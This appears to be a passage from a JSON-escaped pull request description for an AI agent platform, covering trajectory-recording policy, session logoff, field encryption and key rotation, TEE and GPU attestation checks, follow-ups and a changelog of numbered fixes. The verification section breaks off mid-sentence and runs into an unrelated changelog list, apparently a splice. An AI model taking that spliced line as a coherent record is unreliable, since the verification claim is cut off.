to `0506_pii_scrub_markers_inspection_scope`, `0507_user_consents` and `0508_app_notification_secret_envelope_v2`. These are the filenames present in the current branch.\n- The sparse-array bug in canonical backup JSON is fixed.\n- The consents API exposes the effective policy and default, as distinct from an explicit grant.\n\n### Model-call recording, session controls and attestation\n**Recording (no consent; off in production):**\n- The cloud records billed model calls under one policy: `LLM_TRAJECTORY_CAPTURE=on|off`, otherwise off in production and on elsewhere. The `trajectory_training` consent purpose is removed.\n- Payloads never go to the public `BLOB` bucket. They use a dedicated private store when one is bound, otherwise Postgres.\n- Bodies are encrypted with row-bound org field encryption.\n- `LLM_TRAJECTORY_RETENTION_DAYS` (default 90) sets retention, enforced by a daily purge.\n- Account deletion removes payload objects by org prefix, orphans included.\n- The agent's trajectory gate defaults off under `ELIZA_PROTECTED_PROFILE`. Operators can still enable it inside the TEE.\n\n**Session and data safeguards:**\n- **Automatic logoff:** the protected profile gets a 30-minute idle logoff and a 12h absolute cap. `ELIZA_SESSION_IDLE_MINUTES` sets the idle window in any profile. The idle window slides only on real user activity (`x-eliza-last-activity` from the shared UI clients, allowed in CORS for remote agents), never on background polling or sockets.\n- **Password change:** revokes every other session and closes its sockets.\n- **Auth store:** row counts no longer assume success.\n- **Media:** under the protected profile, media is served only after authentication. Same-origin cookie auth keeps `\u003cimg\u003e`/`\u003caudio\u003e` working.\n- **Field encryption:**\n  - Row-bound writes use an `enc:v2` envelope that authenticates its AAD flag.\n  - Unbound writes keep the legacy v1 bytes for old readers.\n  - `SECRETS_MASTER_KEY_PREVIOUS` plus a guarded DEK rewrap enable master-key rotation.\n  - Migration `0508` lets the billing notification guard accept v2.\n- **Audit logs:** the audit-log purge cron now actually runs (7-year retention).\n\n**Attestation implementation and emulator validation (hardware acceptance pending):**\n- **In-repo verification:** dstack v1 attestations and TDX v4/v5 quotes are parsed in-repo. The raw report_data binding, the TD debug bit, the quote's self-signature and register agreement are checked independently of the pinned external verifier.\n- **Hardware-free harness:** a fake guest-agent socket, a pinned stub verifier and an NRAS emulator drive the real admission code to success and through a rejection matrix. The matrix includes dstack simulator output.\n- **GPU attestation:** NVIDIA confidential-GPU attestation goes through NRAS, and the ES384 EAT tokens are verified locally against NVIDIA's CA. GPU claims can only come from verified evidence bound to the TDX nonce.\n- **Key release:** the agent appraises its own evidence before trusting any KMS. A dstack `GetKey` client verifies the KMS signature chain to a pinned root.\n- **Satisfiable topologies:** the state-volume, `tdx-cpu` and GPU weight topologies and the dstack cloud inference profile require only claims that dstack and NRAS evidence actually establish.\n- **Test lanes:** `test:tee:dstack` (hardware-free) and `test:tee:dstack-live`, which is opt-in for a real CVM, the dstack simulator and H100 CC GPUs.\n\nThe model-weight unseal helpers are available, but the production model loader does not yet call `prepareConfidentialModelWeights`. This PR does not establish encrypted-weight loading in the shipped inference path or regulatory compliance.\n\n**Deploy order:**\n- Apply migration `0508` before deploying the Worker. Billing notification secrets are written as `enc:v2`.\n- Roll out readers before relying on `SECRETS_MASTER_KEY_PREVIOUS`.\n\n### Follow-ups\n- **Processing policy:** before any host installs a policy, first-party actions need an `egress` declaration, including `egress: []` for the security evaluator hook. Otherwise every action is denied as `destination_undeclared`. No host installs a policy today.\n- **PII swap:** it now skips `TEXT_TO_SPEECH` and `PII_SCRUB`, so a remote TTS provider receives real names. Confirm this is intended, or scope the skip to local providers.\n- **`FIELD_ENCRYPTION_REQUIRE_AAD`:** it stays off until agent env secrets can be row-bound. They are encrypted before their row id exists.\n- **Real hardware:** running `test:tee:dstack-live` on a dstack TDX CVM (and an H100 CC GPU) needs infrastructure.\n\n## Verification (Node 24.15.0, Bun 1.4.2, merged with develop `4778fe302d5`)\n- Root `bun run verify` passes on the merged tree (284/284 turbo tasks, - android: the SMS gateway secret is no longer written into the tracked `build.gradle`; the template reads env when Gradle runs (#38).\n- app api: first-run rollback always restores config and env (#41).\n- CLI: `db reset` uses the runtime's PGlite resolver (#42), and `config show/get` redact secrets in every output mode (#43).\n\n**Functional**\n- agent: self-API calls use `resolveSelfApiBaseUrl` instead of a hard-coded 2138 (#13).\n- agent: runtime ops settle on throw, and same-family switches get a strategy (#15, #16).\n- assistant: `TargetSourceRegistryService` is registered (#17).\n- agent: view navigate stops after an invalid body, and `X-ElizaOS-UI-Language` is honored (#18, #28).\n- electrobun: no duplicate voice turn, `resetSteward` clears the real state dir, branded builds read `${namespace}.json` (#21–#23).\n- core: streaming context is shared across bundle copies (#33); literal NUL bytes removed from `voice-gate.ts` (#34); the reasoning filter covers all 7 canonical tags (#35).\n- mobile/embed: repeated warm deep links apply (#46), and embed auth failures are logged (#47).\n- app api: a key the user types beats an env key (#49).\n- steward: a 409 tenant-exists response now stops with a typed recovery error (#50).\n- electrobun: the updater no longer owns the menu dispatcher, and event cursors page forward (#51, #52).\n- electrobun: one desktop env-flag parser (#53).\n- CLI: honest exit codes for update, doctor and auth; canonical config writes; phantom pool fields dropped (#54, #57).\n- app: the browser barrel re-exports ui's canonical `AppWindowRenderer`, and the dead fork is deleted (#56).\n- benchmarks: recall-bench and entity-voice-bench import from their plugin homes (#58).\n- agent: dead `shouldReject` branch removed from the context inspector (#59).\n\n**Build / release tooling**\n- The gateway maintainer deploys only on the explicit drift exit code 3 (#60).\n- Device leases are written atomically (#61).\n- apk extract failures propagate (#62).\n-
